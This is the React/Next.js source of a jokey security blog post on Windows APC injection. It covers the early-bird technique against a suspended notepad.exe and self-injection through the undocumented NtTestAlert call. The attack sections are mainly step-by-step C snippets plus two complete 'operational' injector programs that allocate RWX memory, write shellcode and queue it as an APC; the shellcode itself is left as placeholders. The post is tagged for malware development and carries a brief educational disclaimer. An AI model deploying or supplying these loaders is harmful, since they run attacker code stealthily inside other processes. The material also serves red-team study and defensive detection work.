"use client";

import PageLayout from "@/components/PageLayout";
import { motion } from "framer-motion";
import { ArrowLeft, Code, Shield, Cpu, FileCode, Bug, Terminal, AlertTriangle } from "lucide-react";
import Link from "next/link";
import Image from "next/image";
import { isPostComingSoon } from "@/lib/blogUtils";
import { useEffect } from "react";
import { useRouter } from "next/navigation";

// Optional: Table of Contents component (remove if not needed)
const TableOfContents = () => (
  <div className="hidden lg:block p-4 lg:p-6 bg-background/50 border border-border rounded-lg sticky top-24">
    <h2 className="text-base lg:text-lg font-light mb-4 text-foreground">Table of Contents</h2>
    <ul className="space-y-2 text-foreground/70 font-light text-xs lg:text-sm">
      <li><a href="#whats-apc" className="hover:text-foreground transition-colors">1. What's the Deal with APCs?</a></li>
      <li><a href="#early-bird" className="hover:text-foreground transition-colors">2. The Early Bird Gets the Shellcode</a></li>
      <li><a href="#nttestalert" className="hover:text-foreground transition-colors">3. NtTestAlert: Undocumented Chaos</a></li>
      <li><a href="#wrap-up" className="hover:text-foreground transition-colors">4. Wrap-Up</a></li>
    </ul>
  </div>
);

// Section component for consistent styling
const Section = ({ id, title, children, icon: Icon }: { id: string, title: string, children: React.ReactNode, icon: React.ElementType }) => (
  <motion.section 
    id={id} 
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.5 }}
    viewport={{ once: true }}
    className="mb-12"
  >
    <div className="flex items-center mb-4">
      <Icon className="h-5 w-5 mr-3 text-foreground/60" />
      <h2 className="text-2xl md:text-3xl font-light tracking-tight text-foreground">{title}</h2>
    </div>
    <div className="text-foreground/80 font-light leading-relaxed break-words overflow-x-hidden max-w-full">
      {children}
    </div>
  </motion.section>
);

// CodeBlock component for code snippets
const CodeBlock = ({ code, language }: { code: string, language: string }) => (
  <div className="bg-black/80 border border-border rounded-lg p-3 sm:p-4 my-6 overflow-x-auto max-w-full">
    <div className="flex justify-between items-center mb-2">
      <span className="text-foreground/60 text-xs sm:text-sm font-mono">{language}</span>
    </div>
    <pre className="text-foreground/90 font-mono text-xs sm:text-sm leading-relaxed whitespace-pre-wrap break-words overflow-wrap-anywhere word-break-break-all max-w-full">
      <code className="break-words break-all">{code}</code>
    </pre>
  </div>
);

export default function BlogPost() {
  const router = useRouter();
  
  useEffect(() => {
    // Check if this post is marked as coming soon
    if (isPostComingSoon("/blog/apc-injection")) {
      router.push("/blog");
    }
  }, [router]);

  // If coming soon, don't render content (will redirect)
  if (isPostComingSoon("/blog/apc-injection")) {
    return null;
  }

  return (
    <PageLayout>
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12 overflow-x-hidden w-full">
        <div className="max-w-5xl mx-auto w-full">
          {/* Back button */}
          <Link 
            href="/blog" 
            className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm mb-8"
          >
            <ArrowLeft className="mr-2 h-4 w-4" /> Back to yaps
          </Link>

          {/* Header */}
          <header className="text-center mb-12">
            <motion.h1
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="text-3xl sm:text-4xl md:text-5xl font-extralight tracking-tight mb-6 text-foreground break-words"
            >
              APC Injection: Because Why Let Threads Sleep Peacefully?
            </motion.h1>
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.1 }}
              className="text-sm text-foreground/60 font-light"
            >
              <span>September 11, 2025</span>
              <span className="mx-2">•</span>
              <span>4 min read</span>
            </motion.div>
          </header>

       

          {/* Disclaimer */}
          <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 sm:p-6 rounded-lg my-8">
            <div className="flex items-start">
              <AlertTriangle className="h-5 w-5 text-yellow-500 mr-3 mt-0.5 flex-shrink-0" />
              <div className="flex-1">
                <h3 className="text-lg sm:text-xl font-light mb-3 text-foreground break-words">Disclaimer</h3>
                <p className="text-foreground/80 font-light leading-relaxed break-words">
                  This isn't one of those dry academic write-ups. This is me, caffeine-fueled, writing about why Windows threads can't be trusted to mind their own business. Typos might sneak in, but hey, that's the price of authenticity.
                </p>
              </div>
            </div>
          </div>

          {/* Optional: Featured Image */}
          <div className="relative w-full max-w-full aspect-[16/8] rounded-lg overflow-hidden my-12 border border-border">
            <Image
              src="https://images.unsplash.com/photo-1753998941540-081eed4f6397?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=1470"
              alt="APC Injection - Weaponized Windows Threads"
              fill
              className="object-cover"
              sizes="100vw"
            />
          </div>

          {/* Content Grid */}
          <div className="grid lg:grid-cols-4 gap-6 lg:gap-12 w-full max-w-full">
            <div className="lg:col-span-3 w-full max-w-full overflow-x-hidden">
              {/* What's APC */}
              <Section id="whats-apc" title="So, What's the Deal with APCs?" icon={Terminal}>
                <p className="mb-4 break-words">
                  Every Windows thread gets its own little to-do list, called an APC queue. Normally, this is where the OS politely drops tasks for the thread to handle when it's in an alertable state. Think of it like Outlook reminders, but instead of "drink water" it's "execute arbitrary code."
                </p>
                <p className="mb-4 break-words">
                  Now, Microsoft gave us QueueUserAPC, a nice little API that lets you add items to that queue. Sounds harmless, right? Until someone realizes they can drop malicious shellcode in there instead of the usual "update printer driver" chore.
                </p>
                <p className="font-medium text-foreground break-words">
                  In other words: APC injection is just weaponized multitasking.
                </p>
              </Section>

              {/* Early Bird */}
              <Section id="early-bird" title="The Early Bird Gets the Shellcode " icon={Bug}>
                <p className="mb-4 break-words">
                  Let's start with the "early bird" technique. It's called that because the attacker beats Windows to the punch by hijacking a thread before it ever runs properly.
                </p>

                <p className="break-words">Text above the image — intro sentence.</p>

<div className="relative w-full max-w-full my-6 rounded-lg overflow-hidden border border-border">
  <Image
    src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*t46PWqkyOUZJ6CPLz41uyw.png"
    alt="Descriptive alt text"
    width={1200}
    height={600}
    className="w-full h-auto rounded-lg object-contain max-w-full"
    sizes="100vw"
  />
</div>



                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Step 1: Create a Suspended Process</h3>
                <p className="mb-4 break-words">
                  You spin up something innocent, like notepad.exe, but with the CREATE_SUSPENDED flag. Translation: "Hey Notepad, welcome to the party, but stay in the corner and don't touch anything yet."
                </p>

                <CodeBlock 
                  code={`CreateProcessA(
  "C:\\\\Windows\\\\System32\\\\notepad.exe",
  NULL,NULL,NULL,FALSE,
  CREATE_SUSPENDED, NULL,NULL,&startupInfo , &processInfo 
);`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Step 2: Allocate Memory</h3>
                <p className="mb-4 break-words">
                  Use VirtualAllocEx to carve out space in Notepad's memory and mark it executable. Defenders should already be sweating — anytime one process allocates memory inside another, something sketchy is about to happen.
                </p>

                <CodeBlock 
                  code={`payloadMem = VirtualAllocEx(processHandle, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Step 3: Write Payload</h3>
                <p className="mb-4 break-words">
                  Drop your shellcode in there. Nothing fancy, just your favorite message box or whatever you've cooked up.
                </p>

                <CodeBlock 
                  code={`WriteProcessMemory(processHandle, payloadMem, payload, payloadLen, NULL);`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Step 4: Queue the APC</h3>
                <p className="mb-4 break-words">
                  Tell Notepad's suspended thread, "when you finally wake up, first thing you're gonna do is run this payload."
                </p>

                <CodeBlock 
                  code={`PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payloadMem;
QueueUserAPC((PAPCFUNC)apcRoutine , threadHandle , (ULONG_PTR)NULL);`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Step 5: Resume the Thread</h3>
                <p className="mb-4 break-words">
                  Finally, hit play. Instead of writing notes, Notepad will gleefully execute your injected code. Congratulations, you've just hijacked a process without even breaking a sweat.
                </p>

                <CodeBlock 
                  code={`ResumeThread(threadHandle);`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Operational Example</h3>
                <CodeBlock 
                  code={`#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char payload[]= //Shellcode or whatever you want!;

int main(){
  STARTUPINFO startupInfo;
  PROCESS_INFORMATION processInfo;
  LPVOID payloadMem;
  SIZE_T payloadLen = sizeof(payload);
  HANDLE processHandle, threadHandle;
  NTSTATUS status;

  ZeroMemory(&startupInfo, sizeof(startupInfo));
  ZeroMemory(&processInfo, sizeof(processInfo));
  startupInfo.cb = sizeof(startupInfo);

  CreateProcessA(
    "C:\\\\Windows\\\\System32\\\\notepad.exe",
    NULL,NULL,NULL,FALSE,
    CREATE_SUSPENDED, NULL,NULL,&startupInfo , &processInfo 
  ); 

  processHandle = processInfo.hProcess;
  threadHandle = processInfo.hThread;

  payloadMem = VirtualAllocEx(processHandle, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  WriteProcessMemory(processHandle, payloadMem, payload, payloadLen, NULL);

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payloadMem;
  QueueUserAPC((PAPCFUNC)apcRoutine , threadHandle , (ULONG_PTR)NULL);

  ResumeThread(threadHandle);
  return 0;
}`}
                  language="c"
                />
              </Section>
              <p>Text above the image — intro sentence.</p>

<div className="relative w-full max-w-full my-6 rounded-lg overflow-hidden border border-border">
  <Image
    src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*zZwZlHpUGtc797Bn8sJBCQ.png"
    alt="Descriptive alt text"
    width={1200}
    height={600}
    className="w-full h-auto rounded-lg object-contain max-w-full"
    sizes="100vw"
  />
</div>


              {/* NtTestAlert */}
              <Section id="nttestalert" title="NtTestAlert: Because Who Needs Documentation Anyway?" icon={Shield}>
                <p className="mb-4 break-words">
                  If you thought QueueUserAPC was a bit sneaky, NtTestAlert takes it to the next level.
                </p>
                <p className="mb-4 break-words">
                  This little gem is an undocumented syscall — basically Microsoft's way of saying, "Don't touch this... unless you enjoy chaos." Its sole purpose? Force a thread to immediately process any pending APCs.
                </p>
                <p className="mb-4 break-words">
                  No more waiting around for the thread to politely check its queue. You just poke it and say, "Hey, time to run your chores!" And what's waiting for it? Yep... your payload, front and center.
                </p>
                <p className="font-medium text-foreground mb-4 break-words">
                  It's basically the VIP pass of thread execution. Everyone else queues like good citizens, but you? You're already strapped in and screaming on the rollercoaster.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">Operational Example</h3>
                <CodeBlock 
                  code={`#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#pragma comment(lib, "ntdll")
typedef NTSTATUS (NTAPI *NtTestAlertFunction)();

unsigned char shellcode[] = //not gonna repeat the same!;

int main(int argc, char* argv[]) {
  SIZE_T shellcodeSize = sizeof(shellcode);
  HMODULE ntdllModule = GetModuleHandleA("ntdll");
  NtTestAlertFunction testAlert = (NtTestAlertFunction)(GetProcAddress(ntdllModule, "NtTestAlert"));

  LPVOID shellcodeMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(shellcodeMemory, shellcode, shellcodeSize);  // simpler than WriteProcessMemory on self

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeMemory;
  QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)NULL);

  testAlert();  // process pending APCs

  return 0;
}`}
                  language="c"
                />
              </Section>

              {/* Wrap Up */}
              <Section id="wrap-up" title="Wrap-Up" icon={Code}>
                <p className="mb-4 break-words">
                  APC injection is one of those techniques that's both elegant and infuriating. Elegant because it abuses Windows internals in a way that almost feels "by design." Infuriating because once again, attackers get to use normal OS features as weapons, leaving defenders to piece together a mess of alerts that may or may not scream "injection."
                </p>
                <p className="mb-4 break-words">
                  So, whether you're a hacker nerd learning the ropes, a red teamer flexing on defenders, or a blue teamer losing sleep over suspicious VirtualAllocEx calls — congratulations, you now understand why APC injection is one of the cooler (and scarier) code injection methods out there.
                </p>
              </Section>
            </div>
            
            {/* Optional: Sidebar with Table of Contents */}
            <aside className="lg:col-span-1 hidden lg:block">
              <TableOfContents />
            </aside>
          </div>

          {/* Footer */}
          <div className="mt-12 text-center">
            {/* Tags */}
            <div className="flex flex-wrap gap-2 justify-center mb-8">
              {['APC Injection', 'Windows Internals', 'Malware Development', 'Thread Hijacking', 'QueueUserAPC', 'NtTestAlert'].map(tag => (
                <span key={tag} className="px-3 py-1 bg-background/50 border border-border rounded-full text-xs font-light text-foreground/70">
                  {tag}
                </span>
              ))}
            </div>

            {/* Legal Disclaimer */}
            <div className="bg-background/50 border border-border p-4 sm:p-6 rounded-lg my-8 max-w-2xl mx-auto">
              <h3 className="text-lg sm:text-xl font-light mb-3 text-foreground break-words">Legal Disclaimer</h3>
              <p className="text-foreground/80 font-light leading-relaxed break-words">
                This content is for educational purposes only. Techniques, code, and information here are not endorsed for malicious use.
              </p>
            </div>

            {/* Back to yaps link */}
            <Link 
              href="/blog" 
              className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm border border-border px-4 py-2 rounded hover:border-foreground/30"
            >
              More Yaps
            </Link>
          </div>
        </div>
      </div>
    </PageLayout>
  );
}